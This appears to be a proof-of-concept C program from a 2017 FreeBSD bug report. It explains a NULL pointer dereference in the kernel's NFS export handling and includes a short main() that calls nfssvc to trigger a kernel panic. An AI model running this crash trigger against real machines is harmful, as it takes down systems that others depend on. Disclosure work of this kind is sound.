/*
 * expcrash.c
 *     Crash FreeBSD with an NFS export request.

Reported: 20170302 - https://bugs.freebsd.org/bugzilla/show_bug.cgi?id=217508

Description:
When making a mount request with the nfssvc system call, the
mount point may not be fully initialized, resulting in a NULL
pointer and a crash.  This can occur, for example, when making
a NFSSVC_V4ROOTEXPORT call with the MNT_EXPORTED and MNT_EXPUBLIC
flags.  This dispatches to sys_nfsvc which calls nfssvc_nfsd to
nfssvc_srvcall and to nfsrv_v4rootexport with the export arguments 
provided by the caller.  This calls to nfsrv_v4rootexport which
uses the nfsv4root_mnt mount while calling to vfs_export and 
vfs_setpublicfs.  This mount record is not fully populated and
when vfs_setpublicfs uses the VFS_ROOT macro which uses the
VFS_PROLOGUE macro with the mount record, it deferences
mp->mnt_vfc->vfc_flags.  however, mnt_vfc has not yet been initialized
and results in a NULL pointer dereference and a panic.
 */

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>

#include <sys/param.h>
#include <sys/mount.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <fs/nfs/nfskpiport.h>
#include <fs/nfs/nfsproto.h>
#include <fs/nfs/nfsport.h>
#include <fs/nfs/nfs.h>
#include <nfs/nfssvc.h>
#include <unistd.h>

int main(int argc, char **argv)
{
    struct nfsex_args args;
    int x;

    memset(&args, 0, sizeof args);
    args.export.ex_flags = MNT_EXPORTED | MNT_EXPUBLIC;
    x = nfssvc(NFSSVC_V4ROOTEXPORT, &args);
    printf("nfssvc %d\n", x);
    return 0;
}
